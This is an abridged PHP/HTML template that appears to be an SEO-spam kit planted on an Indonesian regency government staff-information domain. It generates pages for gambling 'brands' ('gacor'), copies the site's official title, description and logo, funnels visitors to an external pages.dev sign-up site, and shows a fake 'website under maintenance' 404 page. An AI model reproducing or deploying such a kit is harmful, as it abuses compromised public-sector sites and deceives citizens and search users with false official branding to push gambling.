...
function feedback404()
{
    ...
    echo "<h1><strong>WEBSITE UNDER MAINTENANCE</strong></h1>";
...
$baseAuthor = $BRAND;
$URL  = "https://simpeg.klaten.go.id/?index_pages=$BRAND";
$PAGEURL = "https://simpeg.klaten.go.id/?index_pages=$BRAND";
$AMP = "https://gacor-klaten.pages.dev/?index_pages=$BRAND";
$DAFTAR = "https://gacor-klaten.pages.dev/";
$BANNER = "https://images2.imgbox.com/df/26/IQda45xI_o.png";
$LOGO = "https://images2.imgbox.com/57/01/8rzrrxvc_o.png";
$keyword = "$brand, login $brand, daftar $brand, situs $brand, WAP $brand, link alternatif $brand";

if ($NUMLIST >= 1 && $NUMLIST <= 21134) {
    $TITLE = "$BRAND - Sistem Informasi Kepegawaian Kabupaten Klaten";
    $DESCRIPTION = "$BRAND merupakan platform resmi sistem informasi kepegawaian yang berfungsi untuk meningkatkan efisiensi, transparansi, dan akurasi dalam pengelolaan kepegawaian. Sistem ini menyediakan layanan manajemen data, manajemen evaluasi kinerja, administrasi cuti, pelatihan dan pengembangan aparatur sipil negara di lingkungan Pemerintah Kabupaten Klaten.";
    $description = "$BRAND merupakan platform resmi sistem informasi kepegawaian yang berfungsi untuk meningkatkan efisiensi, transparansi, dan akurasi dalam pengelolaan kepegawaian. Sistem ini menyediakan layanan manajemen data, manajemen evaluasi kinerja, administrasi cuti, pelatihan dan pengembangan aparatur sipil negara di lingkungan Pemerintah Kabupaten Klaten.";
}
...
<!doctype html>
  ...
  <head>
    ...
    <link rel="icon" type="image/x-icon" href="https://simpeg.klaten.go.id/assets/images/logo.png" />
    ...
    <meta name="google-site-verification" content="agWf8-nuiLnBT6Zr4BcGvnieItnC7YY6zGqi8eqlhHM" />
  ...
  <script type="application/ld+json">
{
  ...
  "publisher": {
    ...
    "logo": {
      "@type": "ImageObject",
      "url": "https://simpeg.klaten.go.id/assets/images/logo.png"
    }
  },
  ...
  "></div>
          ...
          <div class='header-inner container--fluid
            ...
            header-layout--with-commerceheader-mobile-layout-logo-center-nav-left
                  ...
                  <div class="header-title-logo">
                    <a href="<?php echo $URL ?>" data-animation-role="header-element">
                      ...
                      <img elementtiming="nbf-header-logo-desktop"
                        src="https://images2.imgbox.com/57/01/8rzrrxvc_o.png"
  ...
  <p><?php echo $DESCRIPTION ?></p> 
                          ...
                          <div class="sqs-add-to-cart-button-wrapper" data-animation-role="button">
                            <a><div
                              ...
                              data-product-type="1" data-use-custom-label="false" data-original-label="Masuk Langsung">
                              <div class="sqs-add-to-cart-button-inner">Masuk Langsung</div>
                            </div></a>
                          </div>
